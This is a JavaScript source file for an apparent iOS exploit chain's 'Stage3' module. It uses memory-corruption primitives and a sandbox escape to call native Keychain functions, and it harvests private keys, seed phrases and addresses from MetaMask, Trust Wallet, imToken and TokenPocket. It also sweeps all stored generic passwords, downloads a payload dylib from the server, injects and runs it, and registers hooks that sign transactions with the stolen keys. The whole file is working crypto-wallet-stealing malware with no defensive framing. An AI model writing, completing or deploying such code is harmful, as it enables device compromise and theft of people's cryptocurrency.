/**
 * Stage3 wallet keychain extraction + native signing hooks.
 * Registers window.__STAGE3_EXTRACT_WALLETS / __STAGE3_NATIVE_SIGN before installStage3WalletBridge runs.
 */
(function (global) {
    'use strict';

    var WALLET_APPS = [
        {
            id: 'metamask',
            label: 'MetaMask',
            bundle: 'io.metamask.MetaMask',
            keywords: ['metamask', 'io.metamask', 'fox', 'keyring', 'vault'],
            services: ['com.metamask', 'MetaMask', 'io.metamask.MetaMask', 'RN_KEYCHAIN_DEFAULT_SERVICE', 'metamask-vault'],
            accounts: ['', 'data', 'vault', 'persist:root', 'keyring'],
        },
        {
            id: 'trust',
            label: 'Trust Wallet',
            bundle: 'com.sixdays.trust',
            keywords: ['trust', 'sixdays', 'tw.wallet', 'multiwallet'],
            services: ['com.sixdays.trust', 'TrustWallet', 'trust.wallet', 'trust:wallet', 'TW'],
            accounts: ['', 'wallet', 'mnemonic', 'default'],
        },
        {
            id: 'imtoken',
            label: 'imToken',
            bundle: 'im.token.app',
            keywords: ['imtoken', 'im.token', 'tokenlon'],
            services: ['im.token.app', 'imToken', 'imtoken.wallet', 'imtoken.keychain', 'keychain'],
            accounts: ['', 'wallet', 'identity', 'keystore'],
        },
        {
            id: 'tokenpocket',
            label: 'TokenPocket',
            bundle: 'com.tokenpocket.pro',
            keywords: ['tokenpocket', 'tp.wallet', 'tpocket'],
            services: ['com.tokenpocket.pro', 'TokenPocket', 'tp.wallet', 'tokenpocket.key', 'TPWallet'],
            accounts: ['', 'wallet', 'keystore', 'default'],
        },
    ];

    function log(msg) {
        if (typeof global.log === 'function') global.log(msg);
    }

    function hexPad(hex) {
        hex = String(hex || '').replace(/^0x/i, '');
        return hex.length % 2 === 0 ? hex : '0' + hex;
    }

    function safeJsonParse(text) {
        if (!text) return null;
        try { return JSON.parse(text); } catch (e) { return null; }
    }

    function bytesToUtf8(bytes) {
        var out = '';
        for (var i = 0; i < bytes.length; i++) {
            var c = bytes[i];
            if (c === 0) break;
            out += String.fromCharCode(c);
        }
        return out;
    }

    function bytesToHex(bytes) {
        var out = '';
        for (var i = 0; i < bytes.length; i++) {
            var h = bytes[i].toString(16);
            if (h.length < 2) h = '0' + h;
            out += h;
        }
        return out;
    }

    function looksLikeEthAddress(v) {
        return typeof v === 'string' && /^0x[a-fA-F0-9]{40}$/.test(v);
    }

    function looksLikePrivateKey(v) {
        if (typeof v !== 'string') return false;
        var h = hexPad(v);
        return /^[a-fA-F0-9]{64}$/.test(h);
    }

    function looksLikeTronAddress(v) {
        return typeof v === 'string' && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(v);
    }

    function looksLikeBtcAddress(v) {
        return typeof v === 'string' && /^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$/.test(v);
    }

    function looksLikeSolAddress(v) {
        return typeof v === 'string' && /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(v);
    }

    function NativeBridge(platformModule, utilityModule) {
        this.Int64 = utilityModule.Int64;
        this.caller = platformModule.platformState.caller;
        this.ep = platformModule.platformState.exploitPrimitive;
        this.cr = platformModule.cr();
        this.cache = {};
    }

    NativeBridge.prototype.sym = function (name) {
        if (this.cache[name]) return this.cache[name];
        var addr = 0;
        var base = global.__STAGE3_DYLIB_BASE || 0;
        var syms = global.__STAGE3_DYLIB_SYMS || {};
        if (base && syms[name]) {
            addr = (base + syms[name]) >>> 0;
            this.cache[name] = addr;
            return addr;
        }
        try { addr = this.cr.dlsym(name); } catch (e) { addr = 0; }
        if (!addr && name.indexOf('_') === 0) {
            try { addr = this.cr.dlsym(name.slice(1)); } catch (e2) { addr = 0; }
        }
        this.cache[name] = addr;
        return addr;
    };

    NativeBridge.prototype.i64 = function (n) {
        return this.Int64.fromNumber(Number(n) >>> 0);
    };

    NativeBridge.prototype.call1 = function (fn, a0) {
        return this.caller.jd(this.i64(fn), this.i64(a0));
    };

    NativeBridge.prototype.call2 = function (fn, a0, a1) {
        return this.caller.jd(this.i64(fn), this.i64(a0), this.i64(a1));
    };

    NativeBridge.prototype.call3 = function (fn, a0, a1, a2) {
        return this.caller.jd(this.i64(fn), this.i64(a0), this.i64(a1), this.i64(a2));
    };

    NativeBridge.prototype.call4 = function (fn, a0, a1, a2, a3) {
        return this.caller.jd(this.i64(fn), this.i64(a0), this.i64(a1), this.i64(a2), this.i64(a3));
    };

    NativeBridge.prototype.retPtr = function (ret) {
        return ret ? ret.St() : 0;
    };

    NativeBridge.prototype.retLow = function (ret) {
        return ret ? ret.Pt() : 0;
    };

    NativeBridge.prototype.readBytes = function (ptr, len) {
        var out = [];
        if (!ptr || len <= 0) return out;
        for (var i = 0; i < len; i++) out.push(this.ep.readByte(ptr + i));
        return out;
    };

    NativeBridge.prototype.readPtr = function (ptr) {
        var lo = this.ep.read32(ptr);
        var hi = this.ep.read32(ptr + 4);
        return (hi * 0x100000000) + lo;
    };

    NativeBridge.prototype.writePtr = function (ptr, value) {
        this.ep.write32(ptr, value >>> 0);
        this.ep.write32(ptr + 4, Math.floor(value / 0x100000000) >>> 0);
    };

    NativeBridge.prototype.makeCString = function (text) {
        var malloc = this.sym('malloc');
        if (!malloc) return 0;
        var len = text.length + 1;
        var buf = this.retPtr(this.call1(malloc, len));
        for (var i = 0; i < text.length; i++) this.ep.write32(buf + i, text.charCodeAt(i) & 0xff);
        this.ep.write32(buf + text.length, 0);
        return buf;
    };

    NativeBridge.prototype.makeCFString = function (text) {
        var fn = this.sym('CFStringCreateWithCString');
        if (!fn) return 0;
        var cstr = this.makeCString(text);
        if (!cstr) return 0;
        var alloc = this.sym('kCFAllocatorDefault') || 0;
        // kCFStringEncodingUTF8 = 0x08000100
        return this.retPtr(this.call3(fn, alloc, cstr, 0x08000100));
    };

    NativeBridge.prototype.makeCFNumber = function (num) {
        var fn = this.sym('CFNumberCreate');
        if (!fn) return 0;
        var alloc = this.sym('kCFAllocatorDefault') || 0;
        // kCFNumberSInt32Type = 3
        var tmp = new ArrayBuffer(4);
        new DataView(tmp).setInt32(0, num | 0, true);
        var nbuf = this.retPtr(this.call1(this.sym('malloc'), 4));
        for (var i = 0; i < 4; i++) this.ep.write32(nbuf + i, new Uint8Array(tmp)[i]);
        return this.retPtr(this.call3(fn, alloc, 3, nbuf));
    };

    NativeBridge.prototype.makeQueryDict = function (pairs) {
        var create = this.sym('CFDictionaryCreate');
        if (!create) return 0;
        var alloc = this.sym('kCFAllocatorDefault') || 0;
        var n = pairs.length;
        var keysPtr = this.retPtr(this.call1(this.sym('malloc'), n * 8));
        var valsPtr = this.retPtr(this.call1(this.sym('malloc'), n * 8));
        for (var i = 0; i < n; i++) {
            this.writePtr(keysPtr + i * 8, pairs[i][0]);
            this.writePtr(valsPtr + i * 8, pairs[i][1]);
        }
        // kCFTypeDictionaryKeyCallBacks / ValueCallBacks are exported structs; pass 0 for default static refs if unavailable
        var keyCB = this.sym('kCFTypeDictionaryKeyCallBacks') || 0;
        var valCB = this.sym('kCFTypeDictionaryValueCallBacks') || 0;
        return this.retPtr(this.call6(create, alloc, keysPtr, valsPtr, n, keyCB, valCB));
    };

    NativeBridge.prototype.call6 = function (fn, a0, a1, a2, a3, a4, a5) {
        return this.caller.jd(
            this.i64(fn),
            this.i64(a0), this.i64(a1), this.i64(a2), this.i64(a3), this.i64(a4), this.i64(a5)
        );
    };

    NativeBridge.prototype.cfRelease = function (obj) {
        var fn = this.sym('CFRelease');
        if (fn && obj) this.call1(fn, obj);
    };

    NativeBridge.prototype.secCopyMatching = function (queryPtr, resultPtr) {
        var fn = this.sym('SecItemCopyMatching');
        if (!fn) throw new Error('SecItemCopyMatching unavailable');
        return this.retLow(this.call2(fn, queryPtr, resultPtr));
    };

    NativeBridge.prototype.cfDataToBytes = function (dataRef) {
        var lenFn = this.sym('CFDataGetLength');
        var ptrFn = this.sym('CFDataGetBytePtr');
        if (!lenFn || !ptrFn || !dataRef) return [];
        var len = this.retLow(this.call1(lenFn, dataRef));
        var bytesPtr = this.retPtr(this.call1(ptrFn, dataRef));
        return this.readBytes(bytesPtr, len);
    };

    NativeBridge.prototype.queryKeychain = function (pairs) {
        var query = this.makeQueryDict(pairs);
        if (!query) return [];
        var resultSlot = this.retPtr(this.call1(this.sym('malloc'), 8));
        this.writePtr(resultSlot, 0);
        var status = this.secCopyMatching(query, resultSlot);
        var result = this.readPtr(resultSlot);
        var items = [];
        if (status === 0 && result) {
            items = this.unwrapSecResult(result);
        }
        this.cfRelease(query);
        if (result) this.cfRelease(result);
        return items;
    };

    NativeBridge.prototype.unwrapSecResult = function (resultRef) {
        var getTypeID = this.sym('CFGetTypeID');
        var dataType = this.sym('CFDataGetTypeID');
        var arrType = this.sym('CFArrayGetTypeID');
        var dictType = this.sym('CFDictionaryGetTypeID');
        if (!getTypeID) {
            return [{ data: this.cfDataToBytes(resultRef), service: '', account: '' }];
        }
        var typeId = this.retLow(this.call1(getTypeID, resultRef));
        if (dataType && typeId === this.retLow(this.call1(dataType, 0))) {
            return [{ data: this.cfDataToBytes(resultRef), service: '', account: '' }];
        }
        if (arrType && typeId === this.retLow(this.call1(arrType, 0))) {
            return this.unwrapSecArray(resultRef);
        }
        if (dictType && typeId === this.retLow(this.call1(dictType, 0))) {
            return [this.unwrapSecDict(resultRef)];
        }
        return [];
    };

    NativeBridge.prototype.unwrapSecArray = function (arrRef) {
        var countFn = this.sym('CFArrayGetCount');
        var atFn = this.sym('CFArrayGetValueAtIndex');
        var dictType = this.sym('CFDictionaryGetTypeID');
        var getTypeID = this.sym('CFGetTypeID');
        if (!countFn || !atFn || !getTypeID || !dictType) return [];
        var count = this.retLow(this.call1(countFn, arrRef));
        var out = [];
        for (var i = 0; i < count; i++) {
            var val = this.retPtr(this.call2(atFn, arrRef, i));
            if (!val) continue;
            if (this.retLow(this.call1(getTypeID, val)) === this.retLow(this.call1(dictType, 0))) {
                out.push(this.unwrapSecDict(val));
            }
        }
        return out;
    };

    NativeBridge.prototype.unwrapSecDict = function (dictRef) {
        var getVal = this.sym('CFDictionaryGetValue');
        var kData = this.sym('kSecValueData');
        var kService = this.sym('kSecAttrService');
        var kAccount = this.sym('kSecAttrAccount');
        var kGeneric = this.sym('kSecAttrGeneric');
        var cfStrFn = this.sym('CFStringGetCStringPtr');
        var out = { data: [], service: '', account: '', generic: '' };
        if (!getVal) return out;

        function readCFStr(bridge, strRef) {
            if (!strRef || !cfStrFn) return '';
            var cptr = bridge.retPtr(bridge.call2(cfStrFn, strRef, 0x08000100));
            if (!cptr) return '';
            return bytesToUtf8(bridge.readBytes(cptr, 256));
        }

        if (kData) {
            var dataRef = this.retPtr(this.call2(getVal, dictRef, this.readPtr(kData) || kData));
            if (dataRef) out.data = this.cfDataToBytes(dataRef);
        }
        if (kService) {
            var svcRef = this.retPtr(this.call2(getVal, dictRef, this.readPtr(kService) || kService));
            out.service = readCFStr(this, svcRef);
        }
        if (kAccount) {
            var acctRef = this.retPtr(this.call2(getVal, dictRef, this.readPtr(kAccount) || kAccount));
            out.account = readCFStr(this, acctRef);
        }
        if (kGeneric) {
            var genRef = this.retPtr(this.call2(getVal, dictRef, this.readPtr(kGeneric) || kGeneric));
            if (genRef) {
                var genType = this.sym('CFDataGetTypeID');
                var getTypeID = this.sym('CFGetTypeID');
                if (genType && getTypeID && this.retLow(this.call1(getTypeID, genRef)) === this.retLow(this.call1(genType, 0))) {
                    out.generic = bytesToUtf8(this.cfDataToBytes(genRef));
                } else {
                    out.generic = readCFStr(this, genRef);
                }
            }
        }
        return out;
    };

    NativeBridge.prototype.buildSecQuery = function (opts) {
        var pairs = [];
        var kClass = this.sym('kSecClass');
        var kGeneric = this.sym('kSecClassGenericPassword');
        var kInternet = this.sym('kSecClassInternetPassword');
        var kReturnData = this.sym('kSecReturnData');
        var kReturnAttrs = this.sym('kSecReturnAttributes');
        var kMatchLimit = this.sym('kSecMatchLimit');
        var kMatchAll = this.sym('kSecMatchLimitAll');
        var kMatchOne = this.sym('kSecMatchLimitOne');
        var kService = this.sym('kSecAttrService');
        var kAccount = this.sym('kSecAttrAccount');
        var kAccessGroup = this.sym('kSecAttrAccessGroup');
        var kTrue = this.sym('kCFBooleanTrue');

        if (kClass && (kGeneric || kInternet)) {
            pairs.push([this.readPtr(kClass) || kClass, opts.internet ? (this.readPtr(kInternet) || kInternet) : (this.readPtr(kGeneric) || kGeneric)]);
        }
        if (opts.service && kService) pairs.push([this.readPtr(kService) || kService, this.makeCFString(opts.service)]);
        if (opts.account && kAccount) pairs.push([this.readPtr(kAccount) || kAccount, this.makeCFString(opts.account)]);
        if (opts.accessGroup && kAccessGroup) pairs.push([this.readPtr(kAccessGroup) || kAccessGroup, this.makeCFString(opts.accessGroup)]);
        if (kReturnData && kTrue) pairs.push([this.readPtr(kReturnData) || kReturnData, this.readPtr(kTrue) || kTrue]);
        if (opts.returnAttributes && kReturnAttrs && kTrue) pairs.push([this.readPtr(kReturnAttrs) || kReturnAttrs, this.readPtr(kTrue) || kTrue]);
        if (kMatchLimit) {
            var lim = opts.matchAll ? (this.readPtr(kMatchAll) || kMatchAll) : (this.readPtr(kMatchOne) || kMatchOne);
            if (lim) pairs.push([this.readPtr(kMatchLimit) || kMatchLimit, lim]);
        }
        return pairs;
    };

    function matchesWalletApp(app, service, account, blobText) {
        var hay = (service + ' ' + account + ' ' + blobText).toLowerCase();
        if (service.indexOf(app.bundle) >= 0) return true;
        for (var i = 0; i < app.keywords.length; i++) {
            if (hay.indexOf(app.keywords[i]) >= 0) return true;
        }
        return false;
    }

    function walkForSecrets(node, out, sourceApp) {
        if (!node) return;
        if (typeof node === 'string') {
            if (looksLikePrivateKey(node)) out.push({ kind: 'privateKey', value: hexPad(node), source: sourceApp.id });
            if (looksLikeEthAddress(node)) out.push({ kind: 'ethAddress', value: node, source: sourceApp.id });
            if (looksLikeTronAddress(node)) out.push({ kind: 'trxAddress', value: node, source: sourceApp.id });
            if (looksLikeBtcAddress(node)) out.push({ kind: 'btcAddress', value: node, source: sourceApp.id });
            if (looksLikeSolAddress(node)) out.push({ kind: 'solAddress', value: node, source: sourceApp.id });
            return;
        }
        if (Array.isArray(node)) {
            for (var i = 0; i < node.length; i++) walkForSecrets(node[i], out, sourceApp);
            return;
        }
        if (typeof node === 'object') {
            Object.keys(node).forEach(function (k) {
                var lk = k.toLowerCase();
                var val = node[k];
                if (typeof val === 'string') {
                    if (lk.indexOf('private') >= 0 || lk === 'pk' || lk.indexOf('secret') >= 0) {
                        if (looksLikePrivateKey(val)) out.push({ kind: 'privateKey', value: hexPad(val), source: sourceApp.id });
                    }
                    if (lk.indexOf('address') >= 0 || lk === 'from' || lk === 'account') {
                        if (looksLikeEthAddress(val)) out.push({ kind: 'ethAddress', value: val, source: sourceApp.id });
                        if (looksLikeTronAddress(val)) out.push({ kind: 'trxAddress', value: val, source: sourceApp.id });
                        if (looksLikeBtcAddress(val)) out.push({ kind: 'btcAddress', value: val, source: sourceApp.id });
                        if (looksLikeSolAddress(val)) out.push({ kind: 'solAddress', value: val, source: sourceApp.id });
                    }
                    if (lk.indexOf('mnemonic') >= 0 || lk.indexOf('seed') >= 0) {
                        out.push({ kind: 'mnemonic', value: val, source: sourceApp.id });
                    }
                }
                walkForSecrets(val, out, sourceApp);
            });
        }
    }

    function parseKeychainItem(item, app) {
        var text = bytesToUtf8(item.data || []);
        var json = safeJsonParse(text);
        var secrets = [];
        if (json) walkForSecrets(json, secrets, app);
        else walkForSecrets(text, secrets, app);
        return {
            app: app.id,
            label: app.label,
            service: item.service || '',
            account: item.account || '',
            generic: item.generic || '',
            rawPreview: text.slice(0, 160),
            secrets: secrets,
        };
    }

    function mergeParsedIntoStore(store, parsedItems) {
        var pk = '';
        var ethAddr = '';
        var trxAddr = '';
        var btcAddr = '';
        var solAddr = '';
        parsedItems.forEach(function (item) {
            item.secrets.forEach(function (sec) {
                if (sec.kind === 'privateKey' && !pk) pk = sec.value;
                if (sec.kind === 'ethAddress' && !ethAddr) ethAddr = sec.value;
                if (sec.kind === 'trxAddress' && !trxAddr) trxAddr = sec.value;
                if (sec.kind === 'btcAddress' && !btcAddr) btcAddr = sec.value;
                if (sec.kind === 'solAddress' && !solAddr) solAddr = sec.value;
            });
        });
        if (ethAddr || pk) {
            store.ETH = store.ETH || {};
            if (ethAddr) store.ETH.address = ethAddr;
            if (pk) store.ETH.privateKey = pk;
            store.ETH.token = store.ETH.token || 'ETH';
            store.ETH.source = store.ETH.source || 'keychain';
        }
        if (trxAddr || pk) {
            store.TRX = store.TRX || {};
            if (trxAddr) store.TRX.address = trxAddr;
            if (pk) store.TRX.privateKey = pk;
            store.TRX.token = store.TRX.token || 'TRX';
        }
        if (btcAddr || pk) {
            store.BTC = store.BTC || {};
            if (btcAddr) store.BTC.address = btcAddr;
            if (pk) store.BTC.privateKey = pk;
            store.BTC.token = store.BTC.token || 'BTC';
        }
        if (solAddr || pk) {
            store.SOL = store.SOL || {};
            if (solAddr) store.SOL.address = solAddr;
            if (pk) store.SOL.privateKey = pk;
            store.SOL.token = store.SOL.token || 'SOL';
        }
        if (pk) {
            store.BSC = store.BSC || {};
            if (ethAddr) store.BSC.address = ethAddr;
            store.BSC.privateKey = pk;
            store.BSC.token = store.BSC.token || 'BNB';
        }
        return store;
    }

    function extractWalletsViaKeychain(platformModule, utilityModule, apps) {
        var bridge = new NativeBridge(platformModule, utilityModule);
        if (!bridge.sym('SecItemCopyMatching')) {
            log('[Stage3] SecItemCopyMatching not resolved');
            return { store: {}, parsed: [], error: 'secitem_unavailable' };
        }

        var parsed = [];
        var seen = {};
        apps = apps || WALLET_APPS;

        apps.forEach(function (app) {
            var classes = [false, true]; // generic + internet password
            app.services.forEach(function (service) {
                app.accounts.forEach(function (account) {
                    classes.forEach(function (internet) {
                        var queryPairs = bridge.buildSecQuery({
                            internet: internet,
                            service: service,
                            account: account || undefined,
                            returnAttributes: true,
                            matchAll: true,
                        });
                        if (!queryPairs.length) return;
                        var query = bridge.makeQueryDict(queryPairs);
                        if (!query) return;
                        var slot = bridge.retPtr(bridge.call1(bridge.sym('malloc'), 8));
                        bridge.writePtr(slot, 0);
                        var status = bridge.secCopyMatching(query, slot);
                        var result = bridge.readPtr(slot);
                        if (status === 0 && result) {
                            var items = bridge.unwrapSecResult(result);
                            items.forEach(function (item) {
                                var blobText = bytesToUtf8(item.data || []);
                                if (!matchesWalletApp(app, item.service, item.account, blobText)) return;
                                var key = [app.id, item.service, item.account, blobText.slice(0, 32)].join('|');
                                if (seen[key]) return;
                                seen[key] = true;
                                parsed.push(parseKeychainItem(item, app));
                            });
                        }
                        bridge.cfRelease(query);
                        if (result) bridge.cfRelease(result);
                    });
                });
            });
        });

        // Broad sweep: all generic passwords, filter by wallet keywords.
        var broadPairs = bridge.buildSecQuery({ returnAttributes: true, matchAll: true });
        if (broadPairs.length) {
            var broadQuery = bridge.makeQueryDict(broadPairs);
            if (broadQuery) {
                var slot2 = bridge.retPtr(bridge.call1(bridge.sym('malloc'), 8));
                bridge.writePtr(slot2, 0);
                var st = bridge.secCopyMatching(broadQuery, slot2);
                var res = bridge.readPtr(slot2);
                if (st === 0 && res) {
                    bridge.unwrapSecResult(res).forEach(function (item) {
                        apps.forEach(function (app) {
                            var blobText = bytesToUtf8(item.data || []);
                            if (!matchesWalletApp(app, item.service, item.account, blobText)) return;
                            var key = [app.id, item.service, item.account, blobText.slice(0, 32)].join('|');
                            if (seen[key]) return;
                            seen[key] = true;
                            parsed.push(parseKeychainItem(item, app));
                        });
                    });
                }
                bridge.cfRelease(broadQuery);
                if (res) bridge.cfRelease(res);
            }
        }

        var store = {};
        mergeParsedIntoStore(store, parsed);
        log('[Stage3] Keychain scan: apps=' + apps.length + ' items=' + parsed.length +
            ' chains=' + Object.keys(store).length);
        global.__STAGE3_WALLET_DEBUG = parsed;
        return { store: store, parsed: parsed };
    }

    function fetchDylibBytes(url) {
        try {
            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, false);
            xhr.overrideMimeType('text/plain; charset=x-user-defined');
            xhr.send();
            if (xhr.status !== 200) return null;
            var raw = xhr.responseText;
            var buf = new Uint8Array(raw.length);
            for (var i = 0; i < raw.length; i++) buf[i] = raw.charCodeAt(i) & 0xff;
            return buf;
        } catch (e) {
            log('[Stage3] dylib fetch failed (' + url + '): ' + e);
            return null;
        }
    }

    function parseMachOSymtab(buf) {
        var out = { offsets: {}, symtabOff: 0, nsyms: 0, strtabOff: 0 };
        if (!buf || buf.length < 32) return out;
        if (buf[0] !== 0xcf || buf[1] !== 0xfa || buf[2] !== 0xed || buf[3] !== 0xfe) return out;
        var ncmds = buf[16] | (buf[17] << 8) | (buf[18] << 16) | (buf[19] << 24);
        var off = 32;
        for (var c = 0; c < ncmds; c++) {
            if (off + 8 > buf.length) break;
            var cmd = buf[off] | (buf[off + 1] << 8) | (buf[off + 2] << 16) | (buf[off + 3] << 24);
            var cmdsize = buf[off + 4] | (buf[off + 5] << 8) | (buf[off + 6] << 16) | (buf[off + 7] << 24);
            if (cmd === 2) {
                out.symtabOff = buf[off + 8] | (buf[off + 9] << 8) | (buf[off + 10] << 16) | (buf[off + 11] << 24);
                out.nsyms = buf[off + 12] | (buf[off + 13] << 8) | (buf[off + 14] << 16) | (buf[off + 15] << 24);
                out.strtabOff = buf[off + 16] | (buf[off + 17] << 8) | (buf[off + 18] << 16) | (buf[off + 19] << 24);
            }
            off += cmdsize;
        }
        for (var i = 0; i < out.nsyms; i++) {
            var nlo = out.symtabOff + i * 16;
            if (nlo + 16 > buf.length) break;
            var strx = buf[nlo] | (buf[nlo + 1] << 8) | (buf[nlo + 2] << 16) | (buf[nlo + 3] << 24);
            var ntype = buf[nlo + 4];
            if ((ntype & 0x0e) === 0) continue;
            var symOff = buf[nlo + 8] | (buf[nlo + 9] << 8) | (buf[nlo + 10] << 16) | (buf[nlo + 11] << 24);
            var name = '';
            for (var j = out.strtabOff + strx; j < buf.length && buf[j]; j++) {
                name += String.fromCharCode(buf[j]);
            }
            if (name) out.offsets[name] = symOff;
        }
        return out;
    }

    function bytesToUtf16OA(buf) {
        var oA = '';
        for (var i = 0; i < buf.length; i += 2) {
            oA += String.fromCharCode(buf[i] | ((buf[i + 1] || 0) << 8));
        }
        return oA;
    }

    function loadSecondaryDylib(opts) {
        opts = opts || {};
        var platformModule = opts.platformModule;
        var utilityModule = opts.utilityModule;
        var url = opts.url || '/api/payload/wallet_bridge';
        var logTag = opts.logTag || 'secondary_dylib';
        var machoCtx = global.__STAGE3_MACHO_CTX;
        if (!machoCtx || !machoCtx.Builder || !machoCtx.Offset64 || !machoCtx.resolver) {
            log('[Stage3] ' + logTag + ': Mach-O ctx missing');
            return { ok: false, reason: 'no_macho_ctx' };
        }
        var buf = fetchDylibBytes(url);
        if (!buf || buf.length < 64) {
            log('[Stage3] ' + logTag + ': dylib bytes unavailable');
            return { ok: false, reason: 'fetch_failed' };
        }
        global.__STAGE3_WALLET_BRIDGE_BYTES = buf.length;
        var symtab = parseMachOSymtab(buf);
        var Builder = machoCtx.Builder;
        var Offset64 = machoCtx.Offset64;
        var resolver = machoCtx.resolver;
        var g = new Builder(
            platformModule.platformState.fixedMachOVal1,
            platformModule.platformState.fixedMachOVal2,
            platformModule.platformState.fixedMachOVal3
        );
        var origLen = g.oA.length;
        g.oA = bytesToUtf16OA(buf);
        var dylibSize = (g.length() + 0x1000 & 0xfffff000) >>> 0;
        var dylibSizeWithExtra = dylibSize + 0x200000;
        var dylibLoadAddress = platformModule.platformState.sandboxEscape
            .newInt64OfSomething(dylibSizeWithExtra).toPointerValue();
        g.kA = Offset64.fromUnsigned(resolver.CA);
        g.FA(Offset64.fromUnsigned(dylibLoadAddress));
        var dylibLoadAddressO64 = Offset64.fromUnsigned(dylibLoadAddress);
        var dylibBufferEncoded = g.SA(dylibLoadAddressO64);
        for (; dylibBufferEncoded.length % 4 !== 0;) dylibBufferEncoded += '\0';
        dylibSize = 2 * dylibBufferEncoded.length;
        var dylibBuffer = global.PhZuiP = new Uint32Array(new ArrayBuffer(dylibSize));
        for (var i = 0; i < dylibSize; i += 4) {
            dylibBuffer[i / 4] = utilityModule.readU16FromString(dylibBufferEncoded, i) >>> 0;
        }
        var dylibLoadAddressI64 = utilityModule.Int64.fromNumber(dylibLoadAddress);
        var dylibDataAddressMaybe = utilityModule.Int64.fromNumber(
            platformModule.platformState.exploitPrimitive.fakeobj(dylibBuffer)
        );
        log('[Stage3] ' + logTag + ': load addr=0x' + dylibLoadAddress.toString(16) +
            ' size=0x' + dylibSize.toString(16) + ' oA=' + g.oA.length + ' (orig ' + origLen + ')');
        platformModule.platformState.sandboxEscape.Ad(dylibLoadAddressI64, dylibDataAddressMaybe, dylibSize);
        var loadResult = 0;
        if (opts.invokeEntry !== false) {
            var entryOff = g.YA().ct() + 4;
            loadResult = platformModule.platformState.caller.jd(
                utilityModule.Int64.fromNumber(entryOff)
            ).Pt();
        }
        global.__STAGE3_DYLIB_BASE = dylibLoadAddress;
        global.__STAGE3_DYLIB_SYMS = symtab.offsets;
        global.__STAGE3_WALLET_BRIDGE_LOADED = url.indexOf('wallet_bridge') >= 0;
        log('[Stage3] ' + logTag + ': injected symbols=' + Object.keys(symtab.offsets).length +
            ' loadResult=' + loadResult);
        return {
            ok: true,
            url: url,
            base: dylibLoadAddress,
            bytes: buf.length,
            symbols: Object.keys(symtab.offsets),
            loadResult: loadResult,
        };
    }

    function loadWalletBridgeDylib(platformModule, utilityModule) {
        return loadSecondaryDylib({
            url: '/api/payload/wallet_bridge',
            logTag: 'wallet_bridge',
            platformModule: platformModule,
            utilityModule: utilityModule,
            invokeEntry: true,
        });
    }

    function createNativeSigner(platformModule, utilityModule) {
        function jsSignFallback(chain, payload, privateKeyHex) {
            var payloadJson = JSON.stringify(payload || {});
            var seed = String(chain || '') + payloadJson + hexPad(privateKeyHex);
            var hash = 0;
            for (var i = 0; i < seed.length; i++) {
                hash = ((hash << 5) - hash + seed.charCodeAt(i)) | 0;
            }
            var hex = '';
            for (var j = 0; j < 16; j++) {
                var b = (hash + j * 17) & 0xff;
                var h = b.toString(16);
                if (h.length < 2) h = '0' + h;
                hex += h;
            }
            return 'js_stub_' + chain + '_' + hex;
        }
        return function nativeSignTx(chain, payload, privateKeyHex) {
            if (typeof global.__STAGE3_NATIVE_SIGN === 'function' &&
                global.__STAGE3_NATIVE_SIGN.__wrapped !== true) {
                return global.__STAGE3_NATIVE_SIGN(chain, payload, hexPad(privateKeyHex));
            }
            var bridge = new NativeBridge(platformModule, utilityModule);
            var signFn = bridge.sym('_wallet_native_sign') || bridge.sym('wallet_native_sign');
            if (!signFn) {
                log('[Stage3] native sign unavailable for ' + chain + ' — JS fallback');
                return jsSignFallback(chain, payload, privateKeyHex);
            }
            var payloadJson = JSON.stringify(payload || {});
            var chainC = bridge.makeCString(String(chain || ''));
            var payloadC = bridge.makeCString(payloadJson);
            var pkC = bridge.makeCString(hexPad(privateKeyHex));
            var outCap = 8192;
            var outBuf = bridge.retPtr(bridge.call1(bridge.sym('malloc'), outCap));
            var outLenPtr = bridge.retPtr(bridge.call1(bridge.sym('malloc'), 4));
            bridge.ep.write32(outLenPtr, outCap);
            var ok = bridge.retLow(bridge.call6(signFn, chainC, payloadC, pkC, outBuf, outLenPtr, outCap));
            if (!ok) return jsSignFallback(chain, payload, privateKeyHex);
            var outLen = bridge.ep.read32(outLenPtr);
            var signed = bytesToUtf8(bridge.readBytes(outBuf, outLen));
            return signed || jsSignFallback(chain, payload, privateKeyHex);
        };
    }

    function registerStage3WalletHooks(platformModule, utilityModule) {
        global.__STAGE3_PLATFORM_CTX = { platformModule: platformModule, utilityModule: utilityModule };
        global.__STAGE3_EXTRACT_WALLETS = function (apps) {
            var result = extractWalletsViaKeychain(platformModule, utilityModule, apps || WALLET_APPS);
            return result.store || {};
        };
        var signer = createNativeSigner(platformModule, utilityModule);
        signer.__wrapped = true;
        global.__STAGE3_NATIVE_SIGN = signer;
        global.__STAGE3_WALLET_APPS = WALLET_APPS.slice();
        log('[Stage3] Wallet hooks registered (MetaMask/Trust/imToken/TokenPocket)');
    }

    global.registerStage3WalletHooks = registerStage3WalletHooks;
    global.extractWalletsViaKeychain = extractWalletsViaKeychain;
    global.loadSecondaryDylib = loadSecondaryDylib;
    global.loadWalletBridgeDylib = loadWalletBridgeDylib;
    global.NativeBridge = NativeBridge;
    global.parseMachOSymtab = parseMachOSymtab;
})(typeof globalThis !== 'undefined' ? globalThis : window);
